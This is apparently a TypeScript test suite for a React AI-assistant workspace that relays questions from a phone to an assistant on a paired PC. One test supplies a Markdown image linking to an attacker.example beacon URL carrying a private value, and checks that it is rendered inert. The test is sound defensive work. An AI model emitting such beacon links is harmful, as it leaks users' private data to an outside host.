import { act, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { publishAiAssistantResult } from "../../foundation/connection/aiAssistantResultBus";
import type { ClientMessage } from "../../foundation/protocol/messages";
import AiAssistantWorkspace from "./AiAssistantWorkspace";

class MockSpeechRecognition {
  static instances: MockSpeechRecognition[] = [];
  continuous = false;
  interimResults = false;
  onresult: ((event: { resultIndex: number; results: ArrayLike<unknown> }) => void) | null = null;
  onend: (() => void) | null = null;
  onerror: ((event: { error?: string }) => void) | null = null;
  start = vi.fn();
  stop = vi.fn();

  constructor() {
    MockSpeechRecognition.instances.push(this);
  }
}

vi.mock("../../foundation/connection/pairingCredentials", () => ({
  signClientPayload: () => "client-signature",
}));

beforeEach(() => {
  Element.prototype.scrollIntoView = vi.fn();
});

afterEach(() => {
  vi.useRealTimers();
  vi.unstubAllGlobals();
  MockSpeechRecognition.instances = [];
});

const capability = {
  enabled: true,
  available: true,
  permissionGranted: true,
  canUse: true,
  requiresRepair: false,
  active: false,
  ownedByClient: false,
  working: false,
};

type SendMock = ReturnType<typeof vi.fn<(message: ClientMessage) => void>>;

function sentOperationId(send: SendMock, type: ClientMessage["type"]): string {
  for (let index = send.mock.calls.length - 1; index >= 0; index -= 1) {
    const message = send.mock.calls[index]?.[0];
    if (message?.type === type && "operationId" in message) {
      return message.operationId;
    }
  }

  throw new Error(`No ${type} operation was sent.`);
}

function workspace(send: (message: ClientMessage) => void) {
  return (
    <AiAssistantWorkspace
      activePc={{
        customName: false,
        hostIdentityPublicKey: "host-key",
        id: "pc-1",
        name: "PC",
        url: "https://pc.test",
      }}
      capability={capability}
      clientId="client-1"
      onBack={vi.fn()}
      send={send}
      state="paired"
    />
  );
}

function workspaceWithCapability(
  send: (message: ClientMessage) => void,
  overrides: Partial<typeof capability>,
) {
  return (
    <AiAssistantWorkspace
      activePc={{
        customName: false,
        hostIdentityPublicKey: "host-key",
        id: "pc-1",
        name: "PC",
        url: "https://pc.test",
      }}
      capability={{ ...capability, ...overrides }}
      clientId="client-1"
      onBack={vi.fn()}
      send={send}
      state="paired"
    />
  );
}

describe("AiAssistantWorkspace", () => {
  it("uses static transcript scrolling when reduced motion is requested", () => {
    const scrollIntoView = vi.fn();
    Element.prototype.scrollIntoView = scrollIntoView;
    vi.stubGlobal(
      "matchMedia",
      vi.fn(() => ({ matches: true }) as MediaQueryList),
    );

    render(workspace(vi.fn<(message: ClientMessage) => void>()));

    expect(scrollIntoView).toHaveBeenLastCalledWith({ behavior: "auto", block: "end" });
  });

  it("discloses PC access, opens automatically, and sends a signed question", async () => {
    const send = vi.fn<(message: ClientMessage) => void>();
    render(workspace(send));

    expect(
      screen
        .getByText("Ask the Voltura Air Assistant", { selector: "label" })
        .classList.contains("visually-hidden"),
    ).toBe(true);
    expect(screen.getByText(/same Windows-user access/u)).toBeTruthy();
    expect(screen.getByText(/conversation is stored by Codex on your PC/u)).toBeTruthy();
    await waitFor(() =>
      expect(send).toHaveBeenCalledWith(
        expect.objectContaining({
          type: "ai.assistant.open",
          clientSignature: "client-signature",
        }),
      ),
    );

    act(() =>
      publishAiAssistantResult({
        type: "ai.assistant.open.result",
        operationId: sentOperationId(send, "ai.assistant.open"),
        succeeded: true,
        code: null,
        message: "AI Assistant ready.",
      }),
    );
    fireEvent.click(screen.getByRole("button", { name: "Top features" }));
    fireEvent.click(screen.getByRole("button", { name: "Send question" }));

    expect(send).toHaveBeenLastCalledWith(
      expect.objectContaining({
        type: "ai.assistant.ask",
        question: "What are the top features of Voltura Air?",
        clientSignature: "client-signature",
      }),
    );
  });

  it("closes a pending automatic open when the workspace unmounts", async () => {
    const send = vi.fn<(message: ClientMessage) => void>();
    const { unmount } = render(workspace(send));
    await waitFor(() =>
      expect(send).toHaveBeenCalledWith(expect.objectContaining({ type: "ai.assistant.open" })),
    );

    unmount();

    expect(send).toHaveBeenLastCalledWith(expect.objectContaining({ type: "ai.assistant.close" }));
  });

  it("ignores result frames from an earlier workspace operation", async () => {
    const send = vi.fn<(message: ClientMessage) => void>();
    render(workspace(send));
    await waitFor(() =>
      expect(send).toHaveBeenCalledWith(expect.objectContaining({ type: "ai.assistant.open" })),
    );
    const input = screen.getByRole("textbox", {
      name: "Ask the Voltura Air Assistant",
    }) as HTMLTextAreaElement;

    act(() =>
      publishAiAssistantResult({
        type: "ai.assistant.open.result",
        operationId: "stale-open-operation",
        succeeded: true,
        code: null,
        message: "Stale result",
      }),
    );
    expect(input.disabled).toBe(true);

    act(() =>
      publishAiAssistantResult({
        type: "ai.assistant.open.result",
        operationId: sentOperationId(send, "ai.assistant.open"),
        succeeded: true,
        code: null,
        message: "AI Assistant ready.",
      }),
    );
    expect(input.disabled).toBe(false);
  });

  it("does not inherit another device's working state when its open is rejected", async () => {
    const send = vi.fn<(message: ClientMessage) => void>();
    render(
      workspaceWithCapability(send, {
        active: true,
        ownedByClient: false,
        working: true,
      }),
    );
    await waitFor(() =>
      expect(send).toHaveBeenCalledWith(expect.objectContaining({ type: "ai.assistant.open" })),
    );

    expect(screen.queryByRole("status")).toBeNull();
    act(() =>
      publishAiAssistantResult({
        type: "ai.assistant.open.result",
        operationId: sentOperationId(send, "ai.assistant.open"),
        succeeded: false,
        code: "busy",
        message: "The AI Assistant is already open on another device.",
      }),
    );

    expect(screen.queryByRole("status")).toBeNull();
    expect(screen.getByText("The AI Assistant is already open on another device.")).toBeTruthy();
  });

  it("adds phone speech recognition to the editable question before sending", async () => {
    vi.stubGlobal("SpeechRecognition", MockSpeechRecognition);
    const send = vi.fn<(message: ClientMessage) => void>();
    render(workspace(send));
    await waitFor(() =>
      expect(send).toHaveBeenCalledWith(expect.objectContaining({ type: "ai.assistant.open" })),
    );
    act(() =>
      publishAiAssistantResult({
        type: "ai.assistant.open.result",
        operationId: sentOperationId(send, "ai.assistant.open"),
        succeeded: true,
        code: null,
        message: "AI Assistant ready.",
      }),
    );

    fireEvent.click(screen.getByRole("button", { name: "Start dictation" }));
    const spoken = Object.assign([{ transcript: "How does Relay work?" }], { isFinal: true });
    act(() => {
      MockSpeechRecognition.instances.at(0)?.onresult?.({ resultIndex: 0, results: [spoken] });
    });

    expect(
      (
        screen.getByRole("textbox", {
          name: "Ask the Voltura Air Assistant",
        }) as HTMLTextAreaElement
      ).value,
    ).toBe("How does Relay work? ");
    fireEvent.click(screen.getByRole("button", { name: "Send question" }));
    expect(send).toHaveBeenLastCalledWith(
      expect.objectContaining({
        type: "ai.assistant.ask",
        question: "How does Relay work?",
      }),
    );
  });

  it("does not split dictated supplementary characters at the question limit", async () => {
    vi.stubGlobal("SpeechRecognition", MockSpeechRecognition);
    const send = vi.fn<(message: ClientMessage) => void>();
    render(workspace(send));
    await waitFor(() =>
      expect(send).toHaveBeenCalledWith(expect.objectContaining({ type: "ai.assistant.open" })),
    );
    act(() =>
      publishAiAssistantResult({
        type: "ai.assistant.open.result",
        operationId: sentOperationId(send, "ai.assistant.open"),
        succeeded: true,
        code: null,
        message: "AI Assistant ready.",
      }),
    );
    const input = screen.getByRole("textbox", {
      name: "Ask the Voltura Air Assistant",
    }) as HTMLTextAreaElement;
    fireEvent.change(input, { target: { value: "a".repeat(16 * 1024 - 1) } });
    fireEvent.click(screen.getByRole("button", { name: "Start dictation" }));
    expect(MockSpeechRecognition.instances).toHaveLength(1);
    const spoken = Object.assign([{ transcript: "😀" }], { isFinal: true });
    act(() => {
      MockSpeechRecognition.instances.at(0)?.onresult?.({ resultIndex: 0, results: [spoken] });
    });

    expect(input.value).toBe("a".repeat(16 * 1024 - 1));
    expect(input.value).not.toContain("�");
  });

  it("keeps the question draft when the host rejects it and clears it after success", async () => {
    const send = vi.fn<(message: ClientMessage) => void>();
    render(workspace(send));
    await waitFor(() =>
      expect(send).toHaveBeenCalledWith(expect.objectContaining({ type: "ai.assistant.open" })),
    );
    act(() =>
      publishAiAssistantResult({
        type: "ai.assistant.open.result",
        operationId: sentOperationId(send, "ai.assistant.open"),
        succeeded: true,
        code: null,
        message: "AI Assistant ready.",
      }),
    );
    const input = screen.getByRole("textbox", {
      name: "Ask the Voltura Air Assistant",
    }) as HTMLTextAreaElement;
    fireEvent.change(input, { target: { value: "Keep this question" } });
    fireEvent.click(screen.getByRole("button", { name: "Send question" }));

    act(() =>
      publishAiAssistantResult({
        type: "ai.assistant.ask.result",
        operationId: sentOperationId(send, "ai.assistant.ask"),
        succeeded: false,
        code: "busy",
        message: "Try again.",
      }),
    );
    expect(input.value).toBe("Keep this question");

    fireEvent.click(screen.getByRole("button", { name: "Send question" }));
    act(() =>
      publishAiAssistantResult({
        type: "ai.assistant.ask.result",
        operationId: sentOperationId(send, "ai.assistant.ask"),
        succeeded: true,
        code: null,
        message: "Question sent.",
      }),
    );
    expect(input.value).toBe("");
  });

  it("keeps a question pending across trailing session state", async () => {
    const send = vi.fn<(message: ClientMessage) => void>();
    render(workspace(send));
    await waitFor(() =>
      expect(send).toHaveBeenCalledWith(expect.objectContaining({ type: "ai.assistant.open" })),
    );
    act(() =>
      publishAiAssistantResult({
        type: "ai.assistant.open.result",
        operationId: sentOperationId(send, "ai.assistant.open"),
        succeeded: true,
        code: null,
        message: "AI Assistant ready.",
      }),
    );
    fireEvent.change(screen.getByRole("textbox", { name: "Ask the Voltura Air Assistant" }), {
      target: { value: "Send once" },
    });
    fireEvent.click(screen.getByRole("button", { name: "Send question" }));
    const askCount = send.mock.calls.filter(
      ([message]) => message.type === "ai.assistant.ask",
    ).length;

    act(() =>
      publishAiAssistantResult({ type: "ai.assistant.state", state: "ready", message: null }),
    );
    fireEvent.click(screen.getByRole("button", { name: "Send question" }));

    expect(send.mock.calls.filter(([message]) => message.type === "ai.assistant.ask")).toHaveLength(
      askCount,
    );
  });

  it("grows the question field with longer input", () => {
    render(workspace(vi.fn()));
    const input = screen.getByRole("textbox", {
      name: "Ask the Voltura Air Assistant",
    }) as HTMLTextAreaElement;
    Object.defineProperty(input, "scrollHeight", { configurable: true, value: 104 });

    fireEvent.change(input, {
      target: { value: "This is a longer question that needs more than one visible line." },
    });

    expect(input.style.height).toBe("104px");
  });

  it("reassembles bounded chunks and renders assistant Markdown", () => {
    render(workspace(vi.fn()));
    act(() => {
      publishAiAssistantResult({ type: "ai.assistant.snapshot.start" });
      publishAiAssistantResult({
        type: "ai.assistant.message",
        sequence: 1,
        messageId: "answer-1",
        chunkIndex: 0,
        finalChunk: false,
        sender: "assistant",
        text: "**Direct** keeps traffic ",
      });
      publishAiAssistantResult({
        type: "ai.assistant.message",
        sequence: 2,
        messageId: "answer-1",
        chunkIndex: 1,
        finalChunk: true,
        sender: "assistant",
        text: "between your devices.",
      });
    });

    expect(screen.getByText("Direct").tagName).toBe("STRONG");
    expect(screen.getByText(/keeps traffic between your devices/u)).toBeTruthy();
  });

  it("renders remote Markdown images as inert text without a fetchable URL", () => {
    const { container } = render(workspace(vi.fn()));
    act(() => {
      publishAiAssistantResult({
        type: "ai.assistant.message",
        sequence: 1,
        messageId: "remote-image-answer",
        chunkIndex: 0,
        finalChunk: true,
        sender: "assistant",
        text: "![status](https://attacker.example/beacon?value=private)",
      });
    });

    expect(screen.getByText("Image omitted: status")).toBeTruthy();
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("attacker.example");
  });

  it("shows a changing progress phrase only while Codex reports a working turn", () => {
    vi.useFakeTimers();
    render(workspace(vi.fn()));
    act(() =>
      publishAiAssistantResult({ type: "ai.assistant.state", state: "working", message: null }),
    );
    expect(screen.getByRole("status").textContent).toContain("Working");

    act(() => {
      vi.advanceTimersByTime(2400);
    });
    expect(screen.getByRole("status").textContent).toContain("Checking");
    act(() =>
      publishAiAssistantResult({ type: "ai.assistant.state", state: "ready", message: null }),
    );
    expect(screen.queryByRole("status")).toBeNull();
  });

  it("retains only the newest bounded conversation window", () => {
    const { container } = render(workspace(vi.fn()));
    act(() => {
      publishAiAssistantResult({ type: "ai.assistant.snapshot.start" });
      for (let index = 0; index < 40; index += 1) {
        publishAiAssistantResult({
          type: "ai.assistant.message",
          sequence: index + 1,
          messageId: `message-${index}`,
          chunkIndex: 0,
          finalChunk: true,
          sender: index % 2 === 0 ? "user" : "assistant",
          text: `Conversation message ${index}`,
        });
      }
    });

    expect(screen.queryByText("Conversation message 7")).toBeNull();
    expect(screen.getByText("Conversation message 8")).toBeTruthy();
    expect(screen.getByText("Conversation message 39")).toBeTruthy();
    expect(container.querySelectorAll(".ai-assistant-message")).toHaveLength(32);
  });
});
